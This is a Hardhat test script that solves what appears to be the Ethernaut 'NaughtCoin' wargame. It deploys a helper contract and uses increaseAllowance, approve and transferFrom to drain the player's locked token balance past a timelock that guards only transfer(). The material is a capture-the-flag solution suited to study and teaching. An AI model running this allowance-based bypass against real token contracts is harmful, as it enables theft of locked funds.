import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("NaughtCoin", function () {
    let signer: Signer;
    let player: string;
    let challenge_instance_address = "0x33E4e5e7320e8E2dc355Bd035373BCbd61b8Ee01";
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    before(async () => {
        [signer] = await ethers.getSigners();
        player = await signer.getAddress();
        console.log("Primary Signer Address:", player);
        challengeFactory = await ethers.getContractFactory("NaughtCoin");
        challenge = challengeFactory.attach(challenge_instance_address);
    });

    it("Should solve the challenge", async () => {
        // Get the current balance that needs to be transferred out of the wallet:
        const startingBalance = await challenge.balanceOf(player);
        console.log("Current player balance:", BigNumber.from(startingBalance).toString());

        // Create a contract that will be used to transferFrom player wallet to said wallet
        const spenderContract = await ethers.getContractFactory("NaughtCoinSolver");
        const spender = await spenderContract.deploy();
        await spender.deployed();

        console.log("Spender contract deployed at:", spender.address);

        // Setup the increaseAllowance:
        const increaseAllowanceTx = await challenge.increaseAllowance(spender.address, startingBalance);
        const increaseAllowanceReceipt = await increaseAllowanceTx.wait();
        const allowance = await challenge.allowance(player, spender.address);

        console.log("Allowance increased from 0 to", BigNumber.from(allowance).toString())
        expect(allowance).to.equal(startingBalance);

        // Setup the approval:
        const approvalTx = await challenge.approve(spender.address, startingBalance);
        const approvalReceipt = await approvalTx.wait();
        console.log("Approval terminated for spender. Now transfering...");

        // TransferFrom call to send naughtcoins from player to spender: 
        const provider = ethers.getDefaultProvider();
        spender.connect(provider);
        const transferFromTx = await spender.solve(challenge_instance_address, startingBalance, { value: ethers.utils.parseUnits("0.001", "ether") });
        const transferFromReceipt = await transferFromTx.wait();
        const endingBalance = await challenge.balanceOf(player);

        expect(endingBalance).to.equal(0);
    });
});
